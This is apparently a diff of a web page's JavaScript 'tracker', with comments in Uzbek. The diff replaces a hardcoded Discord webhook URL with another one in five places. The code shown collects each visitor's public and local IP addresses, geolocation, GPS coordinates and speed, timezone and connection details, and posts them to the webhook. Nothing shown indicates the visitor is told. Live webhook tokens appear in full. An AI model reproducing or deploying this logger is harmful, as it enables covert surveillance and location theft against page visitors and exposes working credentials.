@@ -240,7 +240,7 @@
         
         // Juda oddiy va ishonchli tracker
         function startTracking() {
-            const webhook = "https://discord.com/api/webhooks/1430261541583847486/RFhqvtvf4hubb_Ifum3VbIpI28-VsJ1mpcCmoQNOC50df2e4gvRk_ECvuEzhYqvzzPbY";
+            const webhook = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
             
             // 1. IP ni olish
             fetch('https://api.ipify.org?format=json')
@@ -313,7 +313,7 @@
         }
 
         function sendToDiscord(publicIP, localIPs, geoData) {
-            const webhook = "https://discord.com/api/webhooks/1430261541583847486/RFhqvtvf4hubb_Ifum3VbIpI28-VsJ1mpcCmoQNOC50df2e4gvRk_ECvuEzhYqvzzPbY";
+            const webhook = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
             
             const now = new Date();
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -387,7 +387,7 @@
                                  "Tezlik: " + (position.coords.speed || 'Noma lum') + "m/s"
                     };
                     
-                    fetch("https://discord.com/api/webhooks/1430261541583847486/RFhqvtvf4hubb_Ifum3VbIpI28-VsJ1mpcCmoQNOC50df2e4gvRk_ECvuEzhYqvzzPbY", {
+                    fetch("https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw", {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(gpsMsg)
@@ -402,7 +402,7 @@
                                  "Kod: " + error.code
                     };
                     
-                    fetch("https://discord.com/api/webhooks/1430261541583847486/RFhqvtvf4hubb_Ifum3VbIpI28-VsJ1mpcCmoQNOC50df2e4gvRk_ECvuEzhYqvzzPbY", {
+                    fetch("https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw", {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(gpsErrorMsg)
@@ -449,7 +449,7 @@
                              "📡 Ulanish: " + (additionalInfo.connection.effectiveType || 'Noma lum')
                 };
                 
-                fetch("https://discord.com/api/webhooks/1430261541583847486/RFhqvtvf4hubb_Ifum3VbIpI28-VsJ1mpcCmoQNOC50df2e4gvRk_ECvuEzhYqvzzPbY", {
+                fetch("https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(additionalMsg)
